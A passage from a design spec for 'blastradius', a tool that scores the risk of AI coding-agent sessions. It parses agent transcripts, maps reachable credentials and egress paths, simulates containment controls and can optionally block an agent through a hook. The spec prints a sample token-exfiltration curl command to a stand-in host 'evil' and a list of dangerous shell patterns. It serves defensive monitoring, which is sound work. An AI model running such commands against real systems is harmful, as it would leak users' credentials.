    pub toxic_combinations: Vec<ToxicCombination>,
    pub reasons: Vec<Reason>,
    pub recommended_actions: Vec<String>,
    pub containment_simulation: ContainmentSimulation,
}

pub struct ToxicCombination { pub name: String, pub severity: RiskLevel, pub evidence: Vec<String> }
pub struct Reason { pub signal: String, pub weight: i32, pub evidence: Vec<String>, pub finding_ref: Option<FindingId> }

#[serde(rename_all = "snake_case")] pub enum RiskLevel { Low, Medium, High, Critical }
#[serde(rename_all = "snake_case")] pub enum PolicyDecision { Block, RequireReview, Allow }
```

`ToxicCombination.name` is the stable snake_case id from §23.8 (the dashboard renders the
human `title`); the containment simulator's `suppressed_combinations` reference the **same**
ids. `Reason.finding_ref` is the **real** §9 `FindingId` from the loaded baseline the signal
joined (e.g. `git.push_likelihood`, `egress.connectivity`, `aws.credentials.profiles`) — the
JSON-level proof the numerator came from the denominator, not a re-scan.

> **Severity scale note.** `ToxicCombination.severity` and `RiskLevel` are **session**
> concepts (low/medium/high/critical). They are deliberately kept separate from the §7.3
> `Finding` `Severity` (Info/Notable/Exposed) and the §7.4 `Confidence` enum; the dashboard
> and AI layer **must not** conflate the two scales.

### 23.10 Containment simulator (§15 made quantified)

The simulator recomputes the **same** §23.6 score under each control toggle, suppressing the
ambient findings and toxic-combination legs the control would remove. It is **pure
arithmetic over already-collected evidence** — a counterfactual recompute, never an action:
it does not mount, drop egress, kill the ssh-agent, or change any process state (the control
ids are *labels on suppression sets*). It is read-only (§4.1) and value-free (§4.2):
`containment_simulation` carries only control ids, integer scores `0..100`, integer
reductions, suppressed `finding_ref`s, and toxic-combo names.

```rust
pub struct ContainmentSimulation {
    pub baseline_score: u8,
    pub controls: Vec<ContainmentResult>,    // INDEPENDENT: each control recomputed from baseline
    pub stacked:  Vec<ContainmentStep>,      // CUMULATIVE ladder (the headline)
    pub residual_floor: u8,                   // == all_controls score
    pub residual_reasons: Vec<String>,        // why isolation can't reach 0 (signal ids)
}
pub struct ContainmentResult {
    pub control: ContainmentControl,
    pub category: String,                     // §15 category label
    pub score: u8,
    pub reduction: u8,                         // baseline_score - score (>= 0)
    pub risk_level: RiskLevel,
    pub suppressed_findings: Vec<FindingId>,  // REAL probe ids
    pub suppressed_combinations: Vec<String>, // same ids as toxic_combinations[].name
}
pub struct ContainmentStep { pub control: Option<ContainmentControl>, pub score: u8, pub reduction: u8 }

#[serde(rename_all = "snake_case")]
pub enum ContainmentControl {
    RepoOnlyFilesystem, NoEgress, NoSshAgent, ScopedTempCloudCreds, ProcessIsolation, AllControls,
}
```

**Control → §15 category → suppression set** (all ids are real shipped probe ids; a set that
matches no real id suppresses nothing):

| `control` | §15 category | Suppresses (ambient findings) | Neutralizes |
|---|---|---|---|
| `scoped_temp_cloud_creds` | Credential substitution | `aws.credentials.profiles`, `github.token_source`, `git.credential_store`, `env.secret_names`, store-family file creds | `read_secret` weights; `exfiltration_path` credential leg; `production_deployment_path` cloud-cred leg |
| `repo_only_filesystem` | Filesystem isolation | `cross_repo.dotenv`, `cross_repo.lateral_secrets`, `cross_repo.sibling_repos`, `browser.session_stores`, `credentials.shell_history`, `$HOME`-reachable file creds | `post_root_host_visibility` filesystem leg; `saas_session_hijack` cookie leg; `multi-sensitive-domain` ×1.25 when breadth came from cross-repo reach. Does **not** suppress the in-repo deploy-workflow edit |
| `no_egress` | Egress control | `egress.connectivity`; `egress.mediation` (cloud-metadata reachability — always checked) | `network_access` weight; `exfiltration_path` egress leg; `saas_session_hijack` network leg |
| `no_ssh_agent` | (credential substitution subset; §11 ssh-agent) | `ssh.agent_socket` | (none on its own) — `source_control_mutation_path` now hinges on `git.push_likelihood`, whose basis is readable key files / token source / credential-store host (§12.10), suppressed by `repo_only_filesystem` / `scoped_temp_cloud_creds`, not by removing the agent alone |
| `process_isolation` | Process isolation | `process.proc_environ`, `process.memory_introspection`, `process.cmdline_secrets`, `host.privilege_escalation`, `host.privileged_reachability` | `post_root_host_visibility`; drops the escalation amplifier to ×1.0 |
| `all_controls` | all of the above | Union of every set above | Union; yields the **residual floor** |

**Server-side enforcement** (the fifth §15 category) is intentionally *not* a toggle:
branch protection / review / token scopes are server-side and cannot suppress local
reachability (§12.10). The simulator surfaces the irreducible residual it leaves behind.

**Recompute.** For control `C` with suppression set `S(C)`: drop any `reason` whose
`finding_ref ∈ S(C)` (or whose event lost its only ambient anchor); drop any
`toxic_combination` for which **any** required ambient leg ∈ `S(C)` (a path needs all its
legs); drop any multiplier/amplifier whose driving finding ∈ `S(C)`; re-sum surviving base
weights, apply surviving multipliers, add surviving combination contributions, **cap to
0..100**, and re-derive `risk_level`. **Event-intrinsic** signals survive every control
because they are properties of what the agent *did*, not of ambient reach
(`dangerous_shell_pattern`, `edited_auth/payment/security_code`, in-repo
`modified_dependency_manifest`, the `high_review_risk` combo, the
`human_approved_risky_action` credit) — this is why the `all_controls` floor is non-zero.

The stacked ladder is the headline (controls unioned in the fixed order
`[repo_only_filesystem, no_egress, no_ssh_agent, scoped_temp_cloud_creds,
process_isolation]`, the final step == `all_controls`):

```
  blast radius under containment            score   Δ
  ─────────────────────────────────────────────────────
  baseline (no controls)                      96
  + repo-only filesystem                      61   -35
  + no egress                                 48   -13
  + no ssh-agent                              42    -6
  + scoped temp cloud creds                   28   -14
  + process isolation  (= all controls)       11   -17
  ─────────────────────────────────────────────────────
  irreducible residual                        11
  └ in-repo auth-code edit, unreviewed — needs human review / server-side enforcement (§15).
```

The *independent* (not stacked) deltas feed `recommended_actions[]` ranking, so "biggest
single win first" is stable regardless of stack order. Ordering is fixed so the ladder is
deterministic and snapshot-testable (§18).

### 23.11 Hard rules — value-free & safety reconciliation (§4 / §5)

- **§4.1 Read-only.** Ingesting a transcript/fixture is a read; scoring writes only when
  `--report`/`--output` is requested (under §4.5 rules: private `0600`, temp-file + rename,
  no symlink follow). The PreToolUse `policy_decision` is a verdict returned to the agent
  harness, **not** a mutation — so "optionally BLOCK" stays inside the read-only envelope.
- **§4.2 No secret values, ever.** `SessionReport` and all nested evidence carry only
  shortened paths, command **shapes**, `host:port`, MCP `server`/`tool` names, counts, and
  finding ids/titles. `FileWrite.diff` is **dropped** at `normalize.rs`; `ShellCommand.command`,
  `McpCall.input`, and the free-text `Approval.reason` are swept (inline assignments /
  credential URLs reduced to `key + value_len`); dangerous-pattern hits report the **category**
  only, never the matched substring.
- **§4.3 Two layers.** Layer 1 is the `normalize.rs` ingest boundary (the runtime analogue
  of "probes collect metadata only"). Layer 2 runs `report::redaction::sweep` over the
  serialized `SessionReport` (terminal + JSON), the dashboard `D` payload, the PreToolUse
  hook's stdout decision, and the AI payload — the **same** sweep every other renderer uses.
- **§4.4 Canary self-test (single fixture, both layers).** `self-test-redaction` is extended
  to run a synthetic-secret trace through the session terminal, JSON, and dashboard
  renderers. The fixture plants `br_test_SHOULD_NOT_LEAK` in the two **dropped** fields
  (`file_write.diff`, `mcp_call.input` — proving Layer-1 stripping of a non-pattern token the
  sweep would not catch) **and**, in the **retained** `shell_command.command` field, plants
  the two forms that field actually neutralizes: an inline assignment
  `export BR_CANARY=br_test_SHOULD_NOT_LEAK` (reduced to `key + value_len`) and a
  pattern-shaped `ghp_…` token (caught by the Layer-2 sweep). All must be absent from every
  rendered report. There is still **no `--no-redact`** for traces or session reports.
- **Deterministic engine scores; AI only explains.** `score.rs` + `toxic_combinations.rs`
  compute `risk_score`, `risk_level`, `policy_decision`, `reasons[]`, `toxic_combinations[]`,
  and `containment_simulation`. The `--ai` layer (reusing `src/analyze`, with
  `analyze::redaction_guard` before any send) **only narrates** already-grounded evidence
  over the **value-free `SessionReport`** — never raw `AgentEvent`s, diffs, or `mcp_call`
  inputs — and **never** creates, removes, re-weights, or alters any scored field.
- **§5 Same threat model.** Events are observed actions of the *same* modeled same-user
  actor; the layer assumes **no** new authority — it reclassifies existing reach as
  relevant; it does not extend the threat model.

### 23.12 CLI surface

```
blastradius score [TRACE] [--trace FILE] [--baseline FILE]
                  [--repo PATH] [--session ID]
                  [--json] [--markdown] [--report] [--output DIR]
                  [--ai] [--model MODEL]
                  [--fail-on-score N]
                  [--hook] [--block-on-score N]
                  [--home-wide] [--max-depth N] [--max-repos N]
```

- **Trace input.** Positional `[TRACE]` and `--trace FILE` are equivalent (`blastradius
  score traces/risky.json` is the implicit form); supplying two different paths is exit `2`.
  A trace is a blastradius `SessionTrace` JSON or a Claude Code transcript (auto-detected and
  normalized). With neither, `score` resolves the most recent transcript for `--repo`
  (default cwd repo) under `~/.claude/projects/<repo>/`; `--session ID` disambiguates; none
  found → exit `1` (clear message, not a panic). Codex/Cursor adapters are **mocked**; only
  Claude Code transcripts ingest natively in MVP.
- **Baseline (the denominator) — implicit live scan.** `--baseline FILE` consumes a prior
  §14 `scan`/`compare` JSON. With no `--baseline`, `score` runs the same probe battery as
  `scan` *now* to produce the ambient findings, then performs the JOIN — this is what makes
  the one-shot form work. The scan flags inherit §6 `scan` semantics and are ignored (warned
  once) when `--baseline` is supplied.
- **Output.** Renders a `SessionReport` (§23.9); `--json`/`--markdown`/`--report`/`--output`
  reuse §4.5 conventions verbatim. The terminal block always pairs the number with the
  `reasons[]` evidence and `finding_ref` back-pointers — never a bare `Risk: 87` (§7.2).
- **`--ai` is explain-only** (§23.11) and off by default. The score renders
  identically with or without `--ai`.
- **CI gating — `--fail-on-score N`.** Exits with the existing §19 code `4` (`--fail-on`
  threshold met) when `risk_score ≥ N` (0–100; out of range → exit `2`). **No new exit code
  is introduced.** The gate is on the deterministic score only.
- **`--hook` — PreToolUse live scoring (optional block).** Reads one hook event from stdin,
  **drops/redacts value-bearing fields at ingest (Layer 1) before anything is scored**,
  normalizes it, and scores it incrementally against a **precomputed cached `--baseline`**
  (from a prior `scan`/`score` in the session — it does **not** re-run the full §12 battery
  per tool call; if no cached baseline is available it degrades to **allow**). It emits a
  hook **JSON decision** on stdout (which passes the same Layer-2 sweep), signalled via JSON
  rather than exit status. With `--block-on-score N` (validated `0..=100`; out of range →
  exit `2`) it emits `deny` when projected `risk_score ≥ N`, else `allow`; without it the
  hook is observe-only. The hook path is **deterministic only and never invokes `--ai`**, and
  **always exits `0`** so a scoring hiccup degrades to allow rather than wedging the agent.
- **`blastradius session -- <cmd>` (future / post-MVP).** Wraps a real agent run: launches
  `<cmd>`, captures its tool activity into a trace, scores at exit. This is the one path that
  *executes the user's own command* — blastradius adds no authority and runs no untrusted
  repo code itself (§3 preserved); it only observes. Listed under §22 "does not need."

### 23.13 Dashboard — three-tab session UX (P2)

The existing `dashboard` command (local web page (value-free, swept; UI assets via CDN/webfonts), `src/dashboard/mod.rs`
+ `page.rs`, `/*__BR_DATA__*/` injection) gains session inputs and a tab bar. It reads one
injected `D` object: today's ambient fields plus `D.session` (the `SessionReport`) and
`D.containment`. **The dashboard renders, never scores** — it MUST NOT recompute risk.

```
blastradius dashboard [--trace FILE] [--baseline FILE] [--repo PATH] [--session ID]
                      [--live | --watch] [--ai] ...
```

- **Tab 1 — Reachable Surface** *(the denominator, unchanged).* Today's verdict pill, stat
  tiles, radial blast-radius map, and the full value-free inventory. Unchanged by any
  session; the JOIN target for Tab 3.
- **Tab 2 — Session Timeline** *(the numerator).* A `SessionTimeline` of the **normalized**
  event stream (an additive, Layer-2-swept `session.timeline` array derived from
  `NormalizedEvent` — value-free `Signal`, shortened path / `host:port` / command **shape** /
  `server·tool`, `event_ix`, `approved` flag) — **never** the raw `SessionTrace`. Activated
  events show a chip linking to the Tab-1 node they touched and the Tab-3 reason they fed; the
  chip set is exactly `activated_capabilities[]`.
- **Tab 3 — Blast Radius & Response.** `RiskScoreCard` + live risk meter (bands colored by
  **reusing the existing palette** — `--accent`/`--notable`/`--exposed`; no new hex), the
  `policy_decision` verdict pill, and a **drill-downable score** (click → `reasons[]`, each
  with `signal`/`weight`/`evidence`/`finding_ref` into a Tab-1 node) — so the §7.2
  anti-mystery-score caution holds. `BlastRadiusGraph` renders the evidence-graph JOIN;
  `ToxicCombinationsPanel` (one `.scen` card per combo, `title` + severity tag + value-free
  `evidence[]`); `RecommendedActionsPanel` (styled like §15's `.contain` list);
  `ContainmentSimulator` (the §23.10 ladder as a descending step strip with per-control
  deltas). The dashboard **mints no finding ids** — every `evidence[]`/`finding_ref` resolves
  to a real probe finding on Tab 1.
- **Live mode (`--live`/`--watch`).** Tails a PreToolUse hook feeding normalized events;
  updates the meter/timeline/panels as events arrive, and surfaces a **PreToolUse block
  banner** when `policy_decision == block`. The dashboard only *reflects* the engine's
  verdict (read-only, §4.1).
- **`--ai` stays explain-only across all tabs** (§23.11): the score and bands render
  identically with or without it; the AI request sends only the value-free report.
- **Empty state.** With no `--trace`/`--baseline`, Tabs 2–3 show an empty state and Tab 1
  behaves exactly as today, so the ambient-only demo is a strict superset of current behavior.

### 23.14 Two-person delivery split (frozen contract first) *(historical — the engine is now built; §24.0)*

**Contract first (both, ~half a day):** freeze §23.3 (`AgentEvent` + `SessionTrace`) and
§23.9 (`SessionReport`), commit a `traces/` fixture set (one benign, one risky), and a JSON
round-trip test. Neither track adds a field without updating the fixture.

- **P1 — Rust engine (`src/session/*`).** `trace.rs` (parse transcripts + fixtures;
  enforce §23.4 value-free ingest at the boundary), `normalize.rs`, `classify.rs` (the JOIN),
  `score.rs` (additive × multiplier × escalation), `toxic_combinations.rs`, `report.rs`
  (JSON + terminal, Layer-2 swept). CLI: `score`, `--fail-on-score`, the PreToolUse hook.
- **P2 — dashboard / demo / AI.** The §23.13 components (`SessionTimeline`, `RiskScoreCard`,
  `BlastRadiusGraph`, `ToxicCombinationsPanel`, `RecommendedActionsPanel`,
  `ContainmentSimulator`) in the three-tab shell; wire `src/analyze` `--ai` in as
  **explain-only** over the grounded `reasons[]`/`toxic_combinations[]` (narrator receives
  only the value-free `SessionReport`); the demo flow + the live meter / block banner.

**Seam (historical):** P2 depended only on the frozen `SessionReport` JSON, so P1 could
stub a hand-written report fixture immediately and P2 built the UI against it before the
engine landed. The engine is now built (§24.0); this split is recorded for provenance.

### 23.15 Demo script (`blastradius dashboard --ai`)

1. **Ambient surface (unchanged).** Tab 1 — the §13.1 inventory (~35 probes / ~30 stores).
   *"This is what an agent running as you can reach. It does not change between sessions."*
   (the denominator).
2. **Benign session → low score despite ambient authority.** Score a benign trace (reads
   source, runs `cargo test`, no secret reads, no new egress): Tab 3 shows a **low** score
   even though ambient authority is enormous. The score is driven by what was *touched*, not
   what is *reachable* — numerator vs denominator.
3. **Risky session → critical; paths activated.** Score `traces/risky.json` (edits
   `.github/workflows/deploy.yml`, reads a credential file, opens egress): score jumps to
   **critical**; `ToxicCombinationsPanel` names the activated paths — `production_deployment_path`
   and `exfiltration_path` — each with its event × `finding_ref` evidence chain; the live
   meter is hot; the optional PreToolUse **block** banner shows what live gating would do.
4. **Containment simulator → quantified reduction.** Toggle controls one at a time and watch
   the **same** session score fall (e.g. `96 → 61 → 48 → 42 → 28 → 11`), turning §15 prose
   into a measured feature.

**Close (canonical line):** *"Worktrees hide the problem. blastradius shows the reachable
surface, the activated paths, and the controls that would actually shrink the blast radius."*

### 23.16 Definition of done (extends §22 — additive overlay)

The scoring layer is done when, **in addition** to the §22 MVP contract (which is
unchanged):

- `blastradius score --trace traces/benign.json` and `blastradius score traces/risky.json`
  (implicit live scan) both emit a valid `SessionReport` with `risk_score` (0..100),
  `risk_level`, and `policy_decision`.
- Every `reasons[].finding_ref` resolves to a real §11–§12 `Finding.id` produced by the same
  scan — the JOIN is auditable, not asserted.
- The risky fixture activates ≥1 named toxic combination (e.g. `exfiltration_path`,
  `production_deployment_path`) with a non-empty `evidence[]` chain.
- The containment simulator recomputes the *same* session under each toggle and reports a
  quantified reduction.
- **Value-free proof:** the §4.4 canary self-test runs a synthetic-secret trace —
  `BLASTRADIUS_TEST_SECRET` in a `file_write` diff, an `mcp_call.input`, **and** a
  `shell_command` — through the session JSON, terminal, **and dashboard** renderers and
  asserts no leak; diffs and MCP inputs are dropped/redacted at ingest, command
  secret-substrings reduced.
- **Determinism proof:** scoring the same trace twice yields byte-identical
  `risk_score`/`reasons` with `--ai` off; with `--ai` on, `risk_score` is unchanged.
- `--fail-on-score N` exits with code `4` (§19) when `risk_score ≥ N`.
- The dashboard serves the three tabs and renders the risky `SessionReport` end-to-end with
  **no secret values** anywhere.

**Explicitly NOT required:** `blastradius session -- <cmd>` live wrapping; real
Codex/Cursor adapters (mocked, labeled, is acceptable); PreToolUse `block` enforcement
beyond the demo banner; persisted session history.

### 23.17 Reconciliation map (existing section → change)

| Section | Change |
|---|---|
| §1 Positioning | Add the third register (reachable / touched / response); the reachable inventory is the unchanged denominator. |
| §2 Use cases | Add use case 5 — session blast-radius scoring (`score`). |
| §3 Non-goals | Session layer is read-only + value-free; sole state-change is the opt-in PreToolUse block; not a session recorder or content scorer; nothing uploaded. |
| §4.1–§4.4 | Read-only includes trace ingest + hook verdict; `normalize.rs` is a second Layer-1 boundary; canary self-test extended to session renderers (dropped + retained fields). |
| §5 Threat model | Toxic-combo path names assert *composition*, not exploitation; same modeled same-user actor, no new authority. |
| §6 / §7.2 | `score` (and the already-shipped `dashboard`) added to the command list; the 0–100 score reconciled with the anti-mystery-score stance as a decomposable explained sum. |
| §8 Architecture | Add `analyze/`, `dashboard/`, and `session/` to the module layout. |
| §11 | Dashboard expanded from a single AI panel to the three-tab session UX. |
| §15 | The containment simulator quantifies the §15 checklist per session. |
| §19 | `--fail-on-score` reuses exit `4`; `--hook` always exits `0` and signals via JSON. |
| §22 | Session layer marked additive / post-MVP; `does-not-need` list extended. |

### 23.18 Open decisions (surface, do not assume)

- **Dashboard bind default.** The default bind is `0.0.0.0:5321`, always — there is no
  loopback default and no per-mode bind override. `--bind 127.0.0.1`
  restricts to loopback. A loud no-auth stderr warning prints on any non-loopback bind
  (`src/dashboard/mod.rs`) and MUST be kept by every downstream slice.
- **Toxic-combo path-weight scale** (`critical +40 / high +25 / medium +15`) is the one
  number not literally in the brief — confirm with P1 before freezing (§23.6).
- **`--fail-on-score` exit code.** Resolved here to reuse `4`; if CI needs to distinguish the
  session gate from the ambient `--fail-on` gate, a distinct code `5` is the alternative —
  maintainer's call.

---

## 24. Automatic Session-Transcript Ingestion (AUTO-SLURP) + Retro-Hazard Detection

### 24.0 Status, scope, and the one hard constraint

This document specs two coupled capabilities layered on top of the §23 single-session scorer:

1. **AUTO-SLURP** — passively discover coding-agent session transcripts in well-known on-disk locations (no hooks), parse each agent's native format, and normalize to the frozen `AgentEvent`/`SessionTrace` contract.
2. **RETRO-HAZARD** — join those *historical* sessions against the set of *currently-reachable* `Finding`s a live `scan` produces, and emit a ranked, value-free ledger of "this already happened **and it still matters**."

**Maturity (verified 2026-06-13 — NOW IMPLEMENTED).** `src/session/` exists and is shipped: `trace.rs`, `normalize.rs`, `classify.rs`, `score.rs`, `toxic_combinations.rs`, `report.rs`, `retro.rs`, `history.rs`, and `discovery/` (with the Claude Code + Codex parsers). The `Command` enum is `Scan | Compare | Dashboard | Sessions | AuditHistory | SelfTestRedaction` (the old `Report`/`Version` subcommands were dropped — `--report` is a flag, `--version` is clap-native). The §23/§24 layer is built and tested (the suite includes 30+ `session::` tests plus the §24.8b transcript canary, all passing). What *remains* post-MVP: a **standalone `score` command** (its function ships as `audit-history`); the dashboard's three-tab **live single-trace** view (only the retro `HistoryAuditReport` section is live today); the PreToolUse `--hook`/`block`; `session -- <cmd>` live wrapping; and native parsers for agents beyond Claude Code / Codex (the other registry entries are detection-only).

**The hard constraint (bigger than anything blastradius reads today).** Every input blastradius reads today is value-free *at the source*: a probe `stat`s `~/.aws/credentials`, counts profiles, records `EnvVarMeta{key,value_len}` — the secret is never in hand. **Transcripts break that invariant**: agents read secret files into context (`tool_result` *is* the file), echo env vars, paste tokens into prompts, embed bearer headers in commands. agent-beacon's model — copy content, regex-redact, tag `content.retention=full` (`pkg/asymptoteobserve/privacy.go`) — is the **exact defect to reject**. The slurper extracts **actions only** (paths, command *shapes*, hosts, classifications, counts) and must prove by self-test that no transcript byte carrying a secret reaches any `AgentEvent`, `Finding` evidence, report, dashboard payload, or `--ai` send. Anything that risks surfacing transcript content is a **defect** (a failing test), per §24.8.

---

### 24.1 Discovery registry — well-known passive transcript locations

agent-beacon is **hook/OTLP-based and does not glob** these directories: it receives `transcript_path` from the hook payload, and only **Antigravity** has a beacon-constructed on-disk path (`cli/beacon-hooks/cmd/pre_tool.go`). So blastradius supplies the passive globs itself; beacon's reusable value is (a) the per-agent config-dir conventions (`harness.go DiscoverAll`) and (b) the exact line-format parsers (`cli/beacon-hooks/cmd/stop.go`), session/cwd key-aliasing (`helpers.go`), and action taxonomy (`endpoint_events.go actionForTool`).

Roots are resolved by a `Root` enum (`Home | XdgConfig | XdgData | XdgState | MacAppSupport | CurrentRepo`). CLI agents are `$HOME`-relative and identical on Linux/macOS; only IDE-backed agents diverge (macOS `~/Library/Application Support/…` vs Linux `~/.config/…`), so discovery probes **both** XDG and macOS roots per source and honors `XDG_CONFIG_HOME`/`XDG_DATA_HOME`/`COPILOT_HOME`/`CURSOR_PROJECT_DIR`. A spec whose only root is `MacAppSupport` simply yields zero candidates on Linux — the table is portable with no `cfg!` forks.

| Agent | `agent_tag` | discovery marker | transcript glob (root-relative) | format | parse conf | beacon note |
|---|---|---|---|---|---|---|
| Claude Code | `claude-code` | `Home:.claude/settings.json` | `Home:.claude/projects/<enc-cwd>/<uuid>.jsonl` | JsonlClaude | high | config-only; glob is goal-supplied, format confirmed |
| Codex CLI | `codex` | `Home:.codex/config.toml` | `Home:.codex/sessions/YYYY/MM/DD/rollout-*.jsonl` | JsonlCodex | high | OTEL-only in beacon; distinct rollout schema, world-readable `0644` |
| Copilot CLI | `copilot` | `Home:.copilot/config.json` | `Home:.copilot/session-state/<sid>/events.jsonl` (legacy `history-session-state`) | JsonlCopilot | medium (sniff first record) | session id = filename UUID |
| Cursor CLI | `cursor` | `Home:.cursor/hooks.json` | `Home:.cursor/projects/*/agent-transcripts/*.jsonl` | JsonlCursor | medium (sniff) | strips `<user_query>`/`<attached_files>`/`<git_diff…>` then still discards inner text |
| Cursor IDE | `cursor-ide` | `MacAppSupport:Cursor/User` / `XdgConfig:Cursor/User` | `…/Cursor/User/**/state.vscdb` | SqliteVscdb | low | feature-gated, off by default |
| opencode | `opencode` | `XdgData:opencode` / `XdgConfig:opencode` | `XdgData:opencode/storage/message/<sid>/msg_*.json` | JsonDir | medium | NO transcript file; per-message JSON dir = the session |
| Gemini CLI | `gemini` | `Home:.gemini/settings.json` | `Home:.gemini/tmp/<hash>/chats/*` | JsonGemini | low | checkpointing off by default → often empty |
| Antigravity | `antigravity` | `Home:.gemini/config/hooks.json` | `Home:.gemini/antigravity-cli/brain/<sid>/.system_generated/logs/transcript.jsonl` | JsonlAntigravity | high | the ONLY beacon-constructed passive path |
| Factory Droid | `factory` | `Home:.factory` / `droid` on PATH | `Home:.factory/sessions/*.jsonl` | JsonlClaude | high | `{type:"message", message{role,content[]}}` |
| Devin CLI/Desktop | `devin` | `XdgConfig:devin/config.json` / `Home:.codeium/windsurf/hooks.json` | hook-supplied; no fixed glob → DetectedUnparsed | JsonlClaude | low | Claude shape; CLI=session_id, Cascade=trajectory_id |
| Windsurf/Cascade | `windsurf` | `Home:.codeium/windsurf/hooks.json` | `Home:.codeium/windsurf/**/state.vscdb` | SqliteVscdb | low | feature-gated |
| Aider | `aider` | `CurrentRepo:.aider.chat.history.md` / `Home:.aider.chat.history.md` | both literals (no glob) | MarkdownAider | low (coarse) | Markdown, not JSONL; needs `Root::CurrentRepo` |
| Hermes | `hermes` | `Home:.hermes/config.yaml` | `Home:.hermes/state.db` (SQLite; deferred) | — | low | detect-only |
| Amp | `amp` | `XdgConfig:amp/settings.json` | undocumented / cloud-synced | — | low | detect-only, no parse |

A source that is detectable-but-unparsable (Amp, Hermes-SQLite, Devin-without-hook, any SQLite source when the feature is off) is reported as `SourceStatus::DetectedUnparsed(reason)` so the operator sees "this agent ran here but we can't passively read it," never a silent gap. A source whose config dir exists but yields **zero parsed transcripts** emits `agent <x> configured but 0 transcripts parsed` into `discovery_diagnostics`.

---

### 24.2 Parsing & normalization to `AgentEvent`

#### 24.2.1 Formats (one extractor per distinct line shape)

- **JsonlClaude** (Claude, Devin, Factory): `{type:"user"|"assistant"|"message", message:{role, content}}`, content is a **string OR** an array of blocks `[{type:"text"},{type:"thinking"},{type:"tool_use",name,input},{type:"tool_result"}]`; `isMeta` skipped.
- **JsonlCodex** (distinct): `RolloutLine{RolloutItem}` with `session_meta` / `response_item` (incl. `function_call` argument bodies) / `event_msg`. **Not** the Claude block model — its own value-free extractor; function-call/event-msg bodies are world-readable `0644` and secret-bearing and are dropped at the parse boundary.
- **JsonlCopilot**: `{type:"user.message"|"assistant.message", data:{content}}`.
- **JsonlCursor** (Cursor, VS Code): `{role, message:{content:[{type:"text",text}]}}` with wrapper-tag stripping.
- **JsonlAntigravity**: `{source:"USER_EXPLICIT", type:"USER_INPUT", content:"…<USER_REQUEST>…"}`.
- **JsonGemini**: `~/.gemini/tmp/<hash>/chats` own shape (low confidence).
- **JsonDir** (opencode): per-message `msg_*.json`; directory = session; ordered lexically with **mtime fallback** if ids are non-monotonic in some version.
- **MarkdownAider**: coarse/low-fidelity — recovers `FileWrite{path}` from edit fences and best-effort `ShellCommand` shapes from fenced shell blocks only; tagged `parse_confidence = low`.
- **SqliteVscdb** (Cursor IDE, Windsurf): feature-gated behind `session-sqlite`, default off; `DetectedUnparsed("sqlite feature off")` otherwise.

`identify_agent` is **path-primary, format-confirmed**: the glob implies the agent, but the first parseable record is sniffed so a copied/renamed file (a Codex rollout dropped into `~/.factory/sessions/`) is classified by **content**; a mismatch re-dispatches to the sniffed parser or downgrades to `DetectedUnparsed("format drift")`.

#### 24.2.2 Action taxonomy (from beacon `actionForTool`/`toolFields`, content rejected)

| transcript tool / shape | → `AgentEvent` | extracted (value-free) | dropped at boundary |
|---|---|---|---|
| Read/View/List/Grep/Search, Cursor `beforeReadFile`, Antigravity `view_file`/`list_dir` | `FileRead{path}` | path only | the `tool_result` (file bytes the agent saw) |
| Write/Edit/MultiEdit/Create/apply_patch | `FileWrite{path, diff:None}` | path only | diff / new bytes — never read |
| Bash/shell/run_command/run_terminal_command | `ShellCommand{command}` | command **allowlist shape** (§24.2.3) | env values, operands, heredoc bodies, output |
| `mcp__*` | `McpCall{server, tool, input:None}` | server+tool (userinfo stripped) | call arguments |
| WebFetch/WebSearch/curl/wget/nc/scp | `NetworkAccess{host, port}` | port + classified host token (§24.2.4) | URL path, query, userinfo, body |
| permission.asked/approval.requested | `Approval{approved_by, reason:None}` | decision + actor | free-text reason |

`EventSink` enforces this **structurally**: `FileWrite.diff`, `McpCall.input`, `Approval.reason` are hardwired `None` at the discovery layer — the optional value-bearing fields exist for hook/fixture inputs but **the slurper never populates them**. So §23.4's "drop" becomes "never constructed."

#### 24.2.3 Command-shape extraction — allowlist-by-default (the one retained field)

`ShellCommand.command` is **retained by the frozen contract** (the join needs `curl`/`scp`/`git push` shape; dangerous-pattern detection needs argv). It is the only value-bearing field the slurper populates, reduced under **allowlist-by-default** — the inverse of beacon's 4-regex denylist:

> **Every token is REDACTED to `[redacted:len:N]` unless it positively matches a structural class. Entropy and length never decide to *keep* a token — they may only push toward more redaction.**

1. **Tokenize** (shell-word split; parse failure → whole-string redaction, fail safe).
2. **Keep verbatim only on positive match:** `argv[0]` + recognized subcommands (from a small static verb table, e.g. `git push`, `aws s3 cp`); **bare flags** `-[A-Za-z]`/`--[a-z][a-z0-9-]*` with no attached value; **path operands** only with an explicit prefix (`/`, `./`, `../`, `~/`) and not high-entropy (a base64 blob containing `/` is **not** a path); **host/URL operands** only on a strict host/URL grammar (§24.2.4).
3. **Reduce/redact (default for everything else):** `--flag=VALUE` → keep `--flag=`, redact RHS; separated `-p VALUE`/`-H VALUE`/`--token VALUE` → flag kept, following operand redacted by default; inline `NAME=VALUE` → `NAME=[len:N]` (the `EnvVarMeta` shape); credential URL `scheme://user:pass@host` → `scheme://[redacted]@host`; **any unmatched operand → `[redacted:len:N]` regardless of entropy/length.**
4. **Dangerous-pattern detection** (`curl…|sh`, `rm -rf`, `chmod 777`, `base64 -d`) runs over tokenized argv *before* redaction and reports the **category only**, never the matched substring.

Worked example: `curl -H "Authorization: Bearer sk-live_…" --password=hunter2 https://evil/x?t=ghp_…` → `curl -H [redacted:len:38] --password=[redacted:len:7] [custom egress target]`. The short, low-entropy `hunter2` is redacted precisely because it matches no kept class — an entropy gate would wrongly pass it.

**Honesty:** `ShellCommand.command` is **retained-and-reduced**, not "drop-at-boundary." The allowlist reconstruction makes unanticipated secret positions non-surviving (Layer-1), `normalize.rs` re-applies the same reduction (defense-in-depth), `report::redaction::sweep` runs over rendered output (Layer-2), and the canary self-test (§24.8) is the backstop — the accepted SPEC §23.4 posture, not a stronger guarantee.

#### 24.2.4 `NetworkAccess` — derived, never a transcript field

No source emits a native network event; egress is implicit in command shape and `WebFetch|WebSearch`. Layer-0 derives `NetworkAccess{host,port}` from the host/URL operand of `curl`/`wget`/`nc`/`scp`/`ssh` (passing the strict grammar) or a fetch tool's `url` key. **Host defaults to the `[custom egress target]` token** (the §4.6/§12.11 token), retaining the literal hostname only for a small allowlist of well-known public endpoints; userinfo stripped, URL path/query dropped. The join needs only the egress *signal* + `egress.connectivity` finding, not the destination, so no fidelity is lost and no internal/secret host is ever serialized. A would-be host failing the grammar is redacted as a generic operand and yields no `NetworkAccess` (under-report-safe).

#### 24.2.5 Session keying & boundaries

